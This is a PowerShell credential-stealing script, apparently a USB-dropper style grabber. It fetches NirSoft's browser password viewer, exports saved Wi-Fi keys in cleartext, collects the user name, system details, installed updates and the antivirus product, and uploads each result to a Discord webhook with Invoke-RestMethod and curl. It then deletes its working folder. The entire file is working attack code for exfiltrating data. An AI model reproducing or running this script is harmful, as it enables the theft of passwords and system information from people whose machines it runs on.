$desktop = ([Environment]::GetFolderPath("Desktop"))

function CreateTemp{

  }

function Get-Nirsoft {
  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip
  .\7z\7za.exe e wbpv.zip

}

function SysInfo {

#1. Get User Informations
# Get the date at the selected format
$date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
# Get computer name and user name
$namepc = $env:computername
$user = $env:UserName
# Creates the files with the format i want
$userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
# Writes the output of $userInfo to "userInfo.txt"
$userInfo | Out-File -FilePath "C:\Temp\userInfo.txt" -Encoding utf8

#2. Get Computer Informations
#Create the file to store the info
$computerInfo = Get-ComputerInfo | Out-String
#Get info and then store it to the file
Get-ComputerInfo | Out-File -FilePath "C:\Temp\ComputerInfo.txt" -Encoding utf8

#3. Generating a report of updates installed on the computer
$userDir = "C:\Temp"
$fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
$date = Get-Date
$Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"

$UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
foreach ($Update in $UpdatesInfo) {
    $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
}

$Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8

#Upload files to Discord via the Upload-Discord function
Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"

}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)



$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
}

function Wifi {
# Crée le dossier temporaire wifi dans C:\temp
New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
Set-Location -Path "C:\temp\wifi"

# Exporte les profils Wi-Fi
netsh wlan export profile key=clear

# Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
    $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
} | Out-File -FilePath "wifi.txt" -Encoding utf8

# Charge le fichier wifi.txt sur Discord
Upload-Discord -file "wifi.txt" -text "Wifi password :"

# Retourne au dossier temporaire C:\temp
Set-Location -Path "C:\temp"

# Supprime le dossier temporaire wifi
Remove-Item -Path "C:\temp\wifi" -Force -Recurse

cd C:\temp

}

 function Del-Nirsoft-File {
  cd C:\
  rmdir -R \temp
}

function version-av {
  cd C:\
  mkdir \temp 
  cd \temp
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
  Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"
}
